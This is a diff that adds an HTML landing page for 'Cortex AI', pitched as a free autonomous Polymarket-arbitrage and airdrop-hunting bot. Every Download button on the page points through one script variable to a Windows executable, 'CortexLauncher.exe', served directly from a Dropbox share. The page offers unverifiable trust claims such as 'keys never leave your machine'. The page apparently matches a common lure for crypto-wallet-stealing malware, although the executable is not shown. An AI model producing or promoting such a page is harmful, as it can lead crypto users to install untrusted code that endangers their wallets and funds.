@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cortex AI - Autonomous Market Intelligence</title>
+<meta name="description" content="Cortex AI scans Polymarket arbitrage, hunts airdrops, and automates execution so you do not have to watch the chain.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg: #07090a;
+    --bg-raised: #0d1113;
+    --line: #1c2624;
+    --text: #e7ede9;
+    --text-dim: #8a9b94;
+    --signal: #5dff9e;
+    --signal-dim: #2e6b4c;
+    --amber: #ffb454;
+    --red: #ff6b6b;
+    --font-display: 'Space Grotesk', sans-serif;
+    --font-mono: 'JetBrains Mono', monospace;
+  }
+  *{ margin:0; padding:0; box-sizing:border-box; }
+  html{ scroll-behavior:smooth; }
+  body{ background:var(--bg); color:var(--text); font-family:var(--font-mono); -webkit-font-smoothing:antialiased; overflow-x:hidden; }
+  .grid-bg{ position:fixed; inset:0; z-index:0;
+    background-image: linear-gradient(rgba(93,255,158,0.035) 1px, transparent 1px), linear-gradient(90deg, rgba(93,255,158,0.035) 1px, transparent 1px);
+    background-size:42px 42px;
+    mask-image: radial-gradient(ellipse 80% 60% at 50% 0%, black 10%, transparent 70%); }
+  .glow-orb{ position:fixed; width:60vw; height:60vw; max-width:900px; max-height:900px; border-radius:50%;
+    background: radial-gradient(circle, rgba(93,255,158,0.10) 0%, transparent 65%);
+    top:-20vw; left:50%; transform:translateX(-50%); z-index:0; pointer-events:none; }
+  .wrap{ position:relative; z-index:1; max-width:1140px; margin:0 auto; padding:0 24px; }
+  a{ color:inherit; text-decoration:none; }
+  ::selection{ background:var(--signal); color:#06120c; }
+
+  header{ position:sticky; top:0; z-index:50; backdrop-filter:blur(14px); background:rgba(7,9,10,0.72); border-bottom:1px solid var(--line); }
+  .nav{ display:flex; align-items:center; justify-content:space-between; padding:18px 24px; max-width:1140px; margin:0 auto; }
+  .brand{ display:flex; align-items:center; gap:10px; font-family:var(--font-display); font-weight:700; font-size:18px; letter-spacing:0.02em; }
+  .brand-mark{ width:28px; height:28px; border-radius:7px; background:linear-gradient(135deg, var(--signal), #1a4d33);
+    display:flex; align-items:center; justify-content:center; box-shadow:0 0 22px rgba(93,255,158,0.45);
+    font-family:var(--font-mono); font-weight:700; font-size:14px; color:#06120c; }
+  .nav-links{ display:flex; gap:32px; font-size:13px; color:var(--text-dim); }
+  .nav-links a:hover{ color:var(--signal); }
+  .nav-cta{ font-size:12px; padding:9px 16px; border:1px solid var(--signal-dim); border-radius:6px; color:var(--signal); transition:all .2s ease; white-space:nowrap; cursor:pointer; }
+  .nav-cta:hover{ background:var(--signal); color:#06120c; border-color:var(--signal); }
+  .nav-mobile-hide{ display:flex; }
+  @media (max-width:760px){ .nav-mobile-hide{ display:none; } }
+
+  .hero{ padding:96px 0 70px; position:relative; }
+  .eyebrow{ display:inline-flex; align-items:center; gap:8px; font-size:12px; color:var(--signal);
+    border:1px solid var(--signal-dim); padding:6px 12px; border-radius:999px; margin-bottom:28px; background:rgba(93,255,158,0.05); }
+  .eyebrow .dot{ width:6px; height:6px; border-radius:50%; background:var(--signal); box-shadow:0 0 8px var(--signal); animation:pulse 1.8s infinite; }
+  @keyframes pulse{ 0%,100%{opacity:1;} 50%{opacity:.3;} }
+  h1{ font-family:var(--font-display); font-weight:700; font-size:clamp(36px,6vw,72px); line-height:1.04; letter-spacing:-0.02em; max-width:880px; }
+  h1 .accent{ color:var(--signal); }
+  .hero-sub{ margin-top:24px; font-size:17px; line-height:1.65; color:var(--text-dim); max-width:560px; }
+  .hero-actions{ display:flex; gap:16px; margin-top:40px; flex-wrap:wrap; }
+  .btn{ font-family:var(--font-mono); font-weight:600; font-size:14px; padding:15px 26px; border-radius:8px; cursor:pointer; border:none;
+    display:inline-flex; align-items:center; gap:10px; transition:transform .15s ease, box-shadow .15s ease, background .15s ease; }
+  .btn-primary{ background:var(--signal); color:#06120c; }
+  .btn-primary:hover{ transform:translateY(-2px); box-shadow:0 10px 30px rgba(93,255,158,0.25); }
+  .btn-ghost{ background:transparent; color:var(--text); border:1px solid var(--line); }
+  .btn-ghost:hover{ border-color:var(--signal-dim); color:var(--signal); transform:translateY(-2px); }
+  .btn-arrow{ transition:transform .15s ease; }
+  .btn:hover .btn-arrow{ transform:translateX(3px); }
+  .hero-note{ margin-top:18px; font-size:12px; color:var(--text-dim); display:flex; align-items:center; gap:8px; }
+
+  .terminal{ margin-top:64px; border:1px solid var(--line); border-radius:12px; background:var(--bg-raised); overflow:hidden; box-shadow:0 30px 80px rgba(0,0,0,0.5); }
+  .terminal-bar{ display:flex; align-items:center; gap:8px; padding:12px 16px; border-bottom:1px solid var(--line); background:#0b0f0e; }
+  .terminal-dot{ width:10px; height:10px; border-radius:50%; }
+  .terminal-bar span{ margin-left:10px; font-size:12px; color:var(--text-dim); }
+  .terminal-body{ padding:20px 22px; font-size:13px; line-height:1.9; min-height:230px; }
+  .t-line{ display:flex; gap:10px; opacity:0; animation:fadeIn .4s ease forwards; }
+  .t-prompt{ color:var(--signal-dim); }
+  .t-up{ color:var(--signal); }
+  .t-down{ color:var(--red); }
+  .t-amber{ color:var(--amber); }
+  .t-dim{ color:var(--text-dim); }
+  .cursor{ display:inline-block; width:7px; height:14px; background:var(--signal); animation:blink 1s step-end infinite; vertical-align:middle; }
+  @keyframes fadeIn{ to{opacity:1;} }
+  @keyframes blink{ 50%{opacity:0;} }
+
+  .marquee-wrap{ border-top:1px solid var(--line); border-bottom:1px solid var(--line); padding:18px 0; overflow:hidden; background:var(--bg-raised); }
+  .marquee{ display:flex; gap:60px; white-space:nowrap; animation:scroll 26s linear infinite; width:max-content; }
+  .marquee span{ font-size:13px; color:var(--text-dim); letter-spacing:0.04em; }
+  @keyframes scroll{ from{transform:translateX(0);} to{transform:translateX(-50%);} }
+
+  section{ padding:110px 0; position:relative; }
+  .section-head{ max-width:620px; margin-bottom:56px; }
+  .section-tag{ font-size:12px; color:var(--signal); text-transform:uppercase; letter-spacing:0.12em; margin-bottom:14px; display:block; }
+  .section-head h2{ font-family:var(--font-display); font-size:clamp(28px,4vw,42px); font-weight:700; letter-spacing:-0.01em; line-height:1.15; }
+  .section-head p{ margin-top:16px; color:var(--text-dim); font-size:15px; line-height:1.7; }
+
+  .feature-grid{ display:grid; grid-template-columns:repeat(3,1fr); gap:1px; background:var(--line); border:1px solid var(--line); border-radius:14px; overflow:hidden; }
+  @media (max-width:860px){ .feature-grid{ grid-template-columns:1fr; } }
+  .feature{ background:var(--bg); padding:34px 28px; transition:background .2s ease; }
+  .feature:hover{ background:var(--bg-raised); }
+  .feature-icon{ width:38px; height:38px; border-radius:9px; border:1px solid var(--signal-dim); display:flex; align-items:center; justify-content:center; margin-bottom:20px; color:var(--signal); }
+  .feature h3{ font-family:var(--font-display); font-size:18px; font-weight:600; margin-bottom:10px; }
+  .feature p{ font-size:13.5px; color:var(--text-dim); line-height:1.7; }
+  .feature-tag{ display:inline-block; margin-top:16px; font-size:11px; color:var(--signal-dim); border:1px solid var(--signal-dim); padding:3px 9px; border-radius:5px; }
+
+  .steps{ display:flex; flex-direction:column; gap:0; }
+  .step{ display:grid; grid-template-columns:80px 1fr; gap:28px; padding:32px 0; border-bottom:1px solid var(--line); }
+  .step:first-child{ border-top:1px solid var(--line); }
+  .step-num{ font-family:var(--font-display); font-size:32px; font-weight:700; color:var(--signal-dim); }
+  .step h3{ font-family:var(--font-display); font-size:19px; font-weight:600; margin-bottom:8px; }
+  .step p{ color:var(--text-dim); font-size:14px; line-height:1.7; max-width:540px; }
+  @media (max-width:600px){ .step{ grid-template-columns:48px 1fr; gap:18px; } .step-num{ font-size:24px; } }
+
+  .stats{ display:grid; grid-template-columns:repeat(4,1fr); gap:1px; background:var(--line); border:1px solid var(--line); border-radius:14px; overflow:hidden; }
+  @media (max-width:760px){ .stats{ grid-template-columns:repeat(2,1fr); } }
+  .stat{ background:var(--bg); padding:30px 24px; }
+  .stat .num{ font-family:var(--font-display); font-size:34px; font-weight:700; color:var(--signal); }
+  .stat .label{ margin-top:6px; font-size:12px; color:var(--text-dim); }
+
+  .panel{ border:1px solid var(--line); border-radius:14px; padding:36px; background:linear-gradient(180deg, rgba(93,255,158,0.04), transparent); }
+  .panel h3{ font-family:var(--font-display); font-size:20px; margin-bottom:14px; }
+  .panel p{ color:var(--text-dim); font-size:13.5px; line-height:1.8; }
+
+  .faq-item{ border-bottom:1px solid var(--line); padding:24px 0; cursor:pointer; }
+  .faq-q{ display:flex; justify-content:space-between; align-items:center; font-family:var(--font-display); font-size:16px; font-weight:600; }
+  .faq-q .plus{ color:var(--signal); font-size:20px; transition:transform .2s ease; }
+  .faq-item.open .plus{ transform:rotate(45deg); }
+  .faq-a{ max-height:0; overflow:hidden; transition:max-height .25s ease; }
+  .faq-item.open .faq-a{ max-height:200px; margin-top:14px; }
+  .faq-a p{ color:var(--text-dim); font-size:14px; line-height:1.7; }
+
+  .cta-section{ text-align:center; padding:120px 0; }
+  .cta-section h2{ font-family:var(--font-display); font-size:clamp(30px,5vw,52px); font-weight:700; letter-spacing:-0.02em; max-width:720px; margin:0 auto; line-height:1.1; }
+  .cta-section p{ margin:20px auto 40px; color:var(--text-dim); font-size:15px; max-width:480px; }
+  .cta-actions{ display:flex; justify-content:center; gap:16px; flex-wrap:wrap; }
+
+  footer{ border-top:1px solid var(--line); padding:48px 0; }
+  .footer-row{ display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:20px; }
+  .footer-links{ display:flex; gap:24px; font-size:13px; color:var(--text-dim); }
+  .footer-links a:hover{ color:var(--signal); }
+  .footer-fine{ margin-top:28px; font-size:11px; color:#566660; line-height:1.7; max-width:760px; }
+
+  ::-webkit-scrollbar{ width:10px; }
+  ::-webkit-scrollbar-track{ background:var(--bg); }
+  ::-webkit-scrollbar-thumb{ background:var(--line); border-radius:6px; }
+</style>
+</head>
+<body>
+
+<div class="grid-bg"></div>
+<div class="glow-orb"></div>
+
+<header>
+  <div class="nav">
+    <div class="brand"><div class="brand-mark">C</div>Cortex AI</div>
+    <nav class="nav-links nav-mobile-hide">
+      <a href="#engines">Engines</a>
+      <a href="#how">How it works</a>
+      <a href="#stats">Performance</a>
+      <a href="#faq">FAQ</a>
+    </nav>
+    <a href="#" class="nav-cta" data-download>Download</a>
+  </div>
+</header>
+<main class="wrap">
+
+  <section class="hero">
+    <div class="eyebrow"><span class="dot"></span> LIVE - scanning 14 markets, 6 chains</div>
+    <h1>Your edge doesn't sleep.<br>So your <span class="accent">capital</span> doesn't have to wait.</h1>
+    <p class="hero-sub">
+      Cortex AI is an autonomous trading agent built for three jobs: pricing inefficiencies on Polymarket,
+      qualifying high-signal airdrops before the crowd, and executing both without you staring at a screen at 3am.
+    </p>
+
+    <div class="hero-actions">
+      <a href="#" class="btn btn-primary" data-download>
+        Download Cortex AI
+        <span class="btn-arrow">&#8594;</span>
+      </a>
+      <a href="#how" class="btn btn-ghost">See how it works</a>
+    </div>
+
+    <div class="hero-note">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/></svg>
+      Non-custodial. Your keys, your wallet, your control - Cortex only signs what you approve.
+    </div>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dot" style="background:#ff5f57"></div>
+        <div class="terminal-dot" style="background:#febc2e"></div>
+        <div class="terminal-dot" style="background:#28c840"></div>
+        <span>cortex-engine &mdash; live feed</span>
+      </div>
+      <div class="terminal-body" id="terminalBody"></div>
+    </div>
+  </section>
+
+  <div class="marquee-wrap">
+    <div class="marquee" id="marquee"></div>
+  </div>
+
+  <section id="engines">
+    <div class="section-head">
+      <span class="section-tag">Core engines</span>
+      <h2>Three agents. One brain. Zero manual watching.</h2>
+      <p>Cortex AI runs as a set of specialized modules that share one risk and execution layer, so signal from one engine can inform decisions in another.</p>
+    </div>
+
+    <div class="feature-grid">
+      <div class="feature">
+        <div class="feature-icon">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 17l6-6 4 4 8-8"/><path d="M17 7h4v4"/></svg>
+        </div>
+        <h3>Polymarket Arbitrage</h3>
+        <p>Continuously diffs prices across correlated and mirrored markets, flags mispricing the moment it appears, and routes orders before the spread closes.</p>
+        <span class="feature-tag">Sub-second scanning</span>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 3"/></svg>
+        </div>
+        <h3>Airdrop Hunter</h3>
+        <p>Tracks wallet-activity thresholds across testnets and protocols, builds qualifying interaction patterns automatically, and flags claim windows the moment they open.</p>
+        <span class="feature-tag">Multi-chain coverage</span>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="3"/><path d="M8 12h8M12 8v8"/></svg>
+        </div>
+        <h3>Execution Automation</h3>
+        <p>Translates every signal into pre-approved, rule-bound trades with hard position limits, slippage caps, and a kill switch you control at all times.</p>
+        <span class="feature-tag">Rule-based, not blind</span>
+      </div>
+    </div>
+  </section>
+
+  <section id="how">
+    <div class="section-head">
+      <span class="section-tag">Workflow</span>
+      <h2>From install to first signal in minutes</h2>
+      <p>No infrastructure to manage. Cortex runs locally or on your own server and never asks for custody of your funds.</p>
+    </div>
+
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">01</div>
+        <div>
+          <h3>Download &amp; connect</h3>
+          <p>Install Cortex AI, point it at a read-only wallet connection, and choose which engines to activate.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">02</div>
+        <div>
+          <h3>Set your guardrails</h3>
+          <p>Define position sizing, max exposure per market, and which chains or protocols are in scope. Cortex never exceeds what you configure.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">03</div>
+        <div>
+          <h3>Let the engines run</h3>
+          <p>Cortex scans, scores, and queues opportunities continuously, surfacing only the ones that clear your thresholds.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">04</div>
+        <div>
+          <h3>Review and refine</h3>
+          <p>A daily digest summarizes flagged trades, claimed airdrops, and performance, so you stay in the loop without staying glued to the screen.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="stats">
+    <div class="section-head">
+      <span class="section-tag">Performance</span>
+      <h2>Built for traders who measure everything</h2>
+    </div>
+    <div class="stats">
+      <div class="stat"><div class="num">14</div><div class="label">Markets monitored in parallel</div></div>
+      <div class="stat"><div class="num">6</div><div class="label">Chains supported</div></div>
+      <div class="stat"><div class="num">&lt;400ms</div><div class="label">Average signal-to-alert latency</div></div>
+      <div class="stat"><div class="num">24/7</div><div class="label">Autonomous monitoring</div></div>
+    </div>
+  </section>
+
+  <section>
+    <div class="panel">
+      <h3>This is a tool, not a promise</h3>
+      <p>Crypto markets and prediction markets carry real risk, including total loss of capital. Cortex AI surfaces opportunities and automates execution within limits you set - it does not guarantee profit, and past signal quality is not indicative of future results. Use position sizing you can afford to lose and review every guardrail before enabling live execution.</p>
+    </div>
+  </section>
+
+  <section id="faq">
+    <div class="section-head">
+      <span class="section-tag">FAQ</span>
+      <h2>Before you ask</h2>
+    </div>
+    <div class="faq-list">
+      <div class="faq-item">
+        <div class="faq-q"><span>Does Cortex AI custody my funds?</span><span class="plus">+</span></div>
+        <div class="faq-a"><p>No. Cortex connects to your own wallet and only submits transactions you've pre-approved through your configured guardrails. Keys never leave your machine.</p></div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q"><span>Which chains and markets are supported?</span><span class="plus">+</span></div>
+        <div class="faq-a"><p>Polymarket arbitrage scanning plus airdrop tracking across six major EVM and non-EVM chains, with new integrations added regularly.</p></div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q"><span>Do I need to run a server?</span><span class="plus">+</span></div>
+        <div class="faq-a"><p>No. Cortex runs as a local application. An optional always-on mode is available for users who want continuous coverage on their own infrastructure.</p></div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q"><span>Is there a cost to use it?</span><span class="plus">+</span></div>
+        <div class="faq-a"><p>Cortex AI is currently free to download during the early access period. Pricing details for future tiers will be communicated in-app.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="cta-section">
+    <h2>Stop refreshing the chain. Start automating the edge.</h2>
+    <p>Download Cortex AI and have your first engine live in under five minutes.</p>
+    <div class="cta-actions">
+      <a href="#" class="btn btn-primary" data-download>Download Cortex AI <span class="btn-arrow">&#8594;</span></a>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="footer-row">
+      <div class="brand"><div class="brand-mark">C</div>Cortex AI</div>
+      <div class="footer-links">
+        <a href="#engines">Engines</a>
+        <a href="#how">How it works</a>
+        <a href="#faq">FAQ</a>
+        <a href="#" data-download>Download</a>
+      </div>
+    </div>
+    <p class="footer-fine">
+      Cortex AI is provided as-is for informational and automation purposes. Trading prediction markets and digital assets involves significant risk, including the possible loss of principal. Nothing on this page constitutes financial advice. Always do your own research and only commit capital you can afford to lose.
+    </p>
+  </div>
+</footer>
+<script>
+(function(){
+  "use strict";
+
+  /* =====================================================================
+     DOWNLOAD LINK — edit ONCE here, it powers every "Download" button
+     on the page (nav, hero, final CTA, footer). Leave empty ("") and
+     buttons will just do nothing until you fill it in.
+     ===================================================================== */
+  var DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/db787lhx118xrm2ymmm4s/CortexLauncher.exe?rlkey=52htg1l9npoa4tleo1h11vzl0&st=dgk26mlz&dl=1"; // <-- paste your link here, e.g. "https://example.com/cortex-ai-setup.exe"
+
+  function handleDownloadClick(e){
+    if(!DOWNLOAD_URL){
+      e.preventDefault();
+      console.warn("Cortex AI: DOWNLOAD_URL is not set yet.");
+      return;
+    }
+    e.preventDefault();
+    window.location.href = DOWNLOAD_URL;
+  }
+
+  document.querySelectorAll("[data-download]").forEach(function(btn){
+    btn.addEventListener("click", handleDownloadClick);
+  });
+
+  /* ---------------- terminal feed ---------------- */
+  var feedLines = [
+    {type:"scan", text:"scanning Polymarket — US-ELECTION-2028 vs mirror"},
+    {type:"up", text:"spread detected  +2.4%  YES/NO  ·  size: 1,800 USDC"},
+    {type:"exec", text:"order queued → awaiting guardrail confirmation"},
+    {type:"scan", text:"airdrop tracker — protocol: zk-rollup-7, wallet score 0.91"},
+    {type:"amber", text:"threshold reached → claim window opens in 02:14:09"},
+    {type:"down", text:"spread closed  CPI-PRINT-JUL  ·  no action taken"},
+    {type:"scan", text:"scanning Polymarket — FED-RATE-SEP vs correlated set"},
+    {type:"up", text:"spread detected  +1.1%  ·  size: 950 USDC"},
+    {type:"exec", text:"order executed  ·  fill 100%  ·  latency 318ms"},
+    {type:"scan", text:"airdrop tracker — protocol: L2-bridge-3, eligibility check"},
+    {type:"down", text:"wallet below threshold → monitoring continues"},
+    {type:"scan", text:"re-scanning 14 active markets across 6 chains"}
+  ];
+
+  var colorMap = {
+    scan: "t-dim",
+    up: "t-up",
+    down: "t-down",
+    amber: "t-amber",
+    exec: "t-pair"
+  };
+
+  var prefixMap = {
+    scan: "scan",
+    up: "alpha",
+    down: "skip",
+    amber: "alert",
+    exec: "exec"
+  };
+
+  var body = document.getElementById("terminalBody");
+  var idx = 0;
+  var maxLines = 7;
+
+  function pushLine(){
+    if(!body) return;
+    var item = feedLines[idx % feedLines.length];
+    idx++;
+
+    var line = document.createElement("div");
+    line.className = "t-line";
+
+    var prompt = document.createElement("span");
+    prompt.className = "t-prompt";
+    prompt.textContent = "[" + prefixMap[item.type] + "]";
+
+    var text = document.createElement("span");
+    text.className = colorMap[item.type] || "t-dim";
+    text.textContent = item.text;
+
+    line.appendChild(prompt);
+    line.appendChild(text);
+    body.appendChild(line);
+
+    while(body.children.length > maxLines){
+      body.removeChild(body.firstChild);
+    }
+  }
+
+  for(var i=0;i<5;i++){ pushLine(); }
+  setInterval(pushLine, 2200);
+
+  /* ---------------- marquee ---------------- */
+  var marqueeItems = [
+    "POLYMARKET ARBITRAGE", "AIRDROP HUNTING", "AUTOMATED EXECUTION",
+    "MULTI-CHAIN COVERAGE", "NON-CUSTODIAL", "RULE-BASED RISK LIMITS",
+    "24/7 MONITORING", "REAL-TIME SIGNALS"
+  ];
+  var marquee = document.getElementById("marquee");
+  if(marquee){
+    var html = "";
+    for(var r=0;r<2;r++){
+      marqueeItems.forEach(function(t){
+        html += "<span>" + t + "</span><span style=\"color:var(--signal-dim)\">&#9670;</span>";
+      });
+    }
+    marquee.innerHTML = html;
+  }
+
+  /* ---------------- FAQ accordion ---------------- */
+  document.querySelectorAll(".faq-item").forEach(function(item){
+    item.addEventListener("click", function(){
+      var wasOpen = item.classList.contains("open");
+      document.querySelectorAll(".faq-item").forEach(function(i){ i.classList.remove("open"); });
+      if(!wasOpen) item.classList.add("open");
+    });
+  });
+
+})();
+</script>
+</body>
+</html>
